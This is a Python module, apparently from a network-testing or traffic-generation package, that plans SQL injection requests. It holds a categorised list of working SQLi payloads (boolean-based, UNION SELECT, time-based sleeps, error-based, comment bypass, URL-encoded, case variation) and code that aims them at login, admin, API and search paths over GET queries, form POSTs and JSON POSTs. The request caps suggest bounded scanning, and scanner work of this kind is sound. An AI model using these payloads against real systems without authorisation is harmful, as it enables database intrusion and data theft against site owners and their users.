"""SQL injection payload and URL planning — GET, POST form, and JSON POST bodies."""

from __future__ import annotations

import json
from dataclasses import dataclass
from urllib.parse import quote, urlencode

from dsp.protocols.base import HttpProtocolError
from dsp.protocols.http.urls import (
    PORT_PRIORITY,
    build_url,
    select_port_for_host,
)

SQLI_MAX_HOSTS_DEFAULT = 2
SQLI_MAX_REQUESTS_PER_HOST_DEFAULT = 10
SQLI_MAX_REQUESTS_TOTAL_DEFAULT = 20

SQLI_PATHS: tuple[str, ...] = (
    "/login",
    "/admin",
    "/api",
    "/search",
    "/index.html",
)

SQLI_PARAM_NAMES: tuple[str, ...] = (
    "id",
    "user",
    "username",
    "q",
    "search",
    "product",
    "item",
    "category",
    "sort",
    "filter",
)

SQLI_PAYLOAD_CATEGORIES: dict[str, tuple[str, ...]] = {
    "boolean_based": (
        "' OR '1'='1",
        "' OR 1=1--",
        "1' AND '1'='1",
        "admin' AND 1=1--",
    ),
    "union_select": (
        "' UNION SELECT NULL--",
        "' UNION SELECT 1,2,3--",
        "1 UNION SELECT user(),database()--",
    ),
    "time_based": (
        "' OR SLEEP(5)--",
        "'; WAITFOR DELAY '0:0:3'--",
        "1' AND pg_sleep(3)--",
    ),
    "error_based": (
        "' AND 1=CONVERT(int,(SELECT @@version))--",
        "' AND extractvalue(1,concat(0x7e,version()))--",
    ),
    "comment_bypass": (
        "admin'--",
        "admin'#",
        "admin'/*",
    ),
    "encoded": (
        "%27%20OR%201%3D1--",
        "1%27%20OR%20%271%27%3D%271",
    ),
    "case_variation": (
        "' oR '1'='1",
        "' UnIoN SeLeCt 1--",
    ),
}

SQLI_TRANSPORTS: tuple[str, ...] = ("query", "form", "json")

SQLI_PAYLOADS: tuple[str, ...] = tuple(
    payload for group in SQLI_PAYLOAD_CATEGORIES.values() for payload in group
)


@dataclass(frozen=True)
class PlannedSqliRequest:
    host: str
    port: int
    path: str
    parameter: str
    payload: str
    payload_category: str
    transport: str
    method: str = "GET"
    query: str = ""
    body: bytes | None = None
    content_type: str | None = None

    @property
    def url(self) -> str:
        return build_sqli_url(self.host, self.port, self.path, self.query)


def build_sqli_url(host: str, port: int, path: str, query: str) -> str:
    """Build HTTP/HTTPS URL with optional query string appended to path."""
    base = build_url(host, port, path)
    if not query:
        return base
    encoded = quote(query, safe="='&?")
    return f"{base}?{encoded}"


def _payload_specs() -> list[tuple[str, str]]:
    specs: list[tuple[str, str]] = []
    for category, payloads in SQLI_PAYLOAD_CATEGORIES.items():
        for payload in payloads:
            specs.append((category, payload))
    return specs


def _build_request_for_transport(
    host: str,
    port: int,
    path: str,
    parameter: str,
    payload: str,
    payload_category: str,
    transport: str,
) -> PlannedSqliRequest:
    if transport == "query":
        query = f"{parameter}={payload}"
        return PlannedSqliRequest(
            host=host,
            port=port,
            path=path,
            parameter=parameter,
            payload=payload,
            payload_category=payload_category,
            transport=transport,
            method="GET",
            query=query,
        )
    if transport == "form":
        body = urlencode({parameter: payload}).encode("utf-8")
        return PlannedSqliRequest(
            host=host,
            port=port,
            path=path,
            parameter=parameter,
            payload=payload,
            payload_category=payload_category,
            transport=transport,
            method="POST",
            body=body,
            content_type="application/x-www-form-urlencoded",
        )
    if transport == "json":
        body = json.dumps({parameter: payload}).encode("utf-8")
        return PlannedSqliRequest(
            host=host,
            port=port,
            path=path,
            parameter=parameter,
            payload=payload,
            payload_category=payload_category,
            transport=transport,
            method="POST",
            body=body,
            content_type="application/json",
        )
    raise HttpProtocolError(f"unknown SQLi transport: {transport!r}")


def plan_sqli_requests(
    hosts: list[str],
    *,
    endpoints: list[tuple[str, int]] | None = None,
    max_hosts: int = SQLI_MAX_HOSTS_DEFAULT,
    max_per_host: int = SQLI_MAX_REQUESTS_PER_HOST_DEFAULT,
    max_total: int = SQLI_MAX_REQUESTS_TOTAL_DEFAULT,
    port_priority: tuple[int, ...] = PORT_PRIORITY,
    paths: tuple[str, ...] = SQLI_PATHS,
) -> list[PlannedSqliRequest]:
    """
    Plan SQL injection HTTP requests across hosts, paths, parameters, and payload categories.

    Uses GET query strings, POST form bodies, and JSON POST bodies.
    """
    if max_hosts < 1 or max_per_host < 1 or max_total < 1:
        raise HttpProtocolError("request caps must be positive")
    if not paths:
        raise HttpProtocolError("at least one path is required")

    if endpoints:
        selected: list[tuple[str, int]] = [(h.strip(), int(p)) for h, p in endpoints if h.strip()][:max_hosts]
    else:
        selected = [
            (h.strip(), select_port_for_host(i, port_priority))
            for i, h in enumerate(h for h in hosts if h.strip())
        ][:max_hosts]

    if not selected:
        raise HttpProtocolError("at least one host is required")

    specs = _payload_specs()
    plans: list[PlannedSqliRequest] = []
    spec_index = 0
    param_index = 0
    path_index = 0
    transport_index = 0

    for host, port in selected:
        host_count = 0
        while host_count < max_per_host and len(plans) < max_total:
            category, payload = specs[spec_index % len(specs)]
            parameter = SQLI_PARAM_NAMES[param_index % len(SQLI_PARAM_NAMES)]
            path = paths[path_index % len(paths)]
            transport = SQLI_TRANSPORTS[transport_index % len(SQLI_TRANSPORTS)]
            plans.append(
                _build_request_for_transport(
                    host,
                    port,
                    path,
                    parameter,
                    payload,
                    category,
                    transport,
                )
            )
            host_count += 1
            spec_index += 1
            param_index += 1
            path_index += 1
            transport_index += 1

    return plans
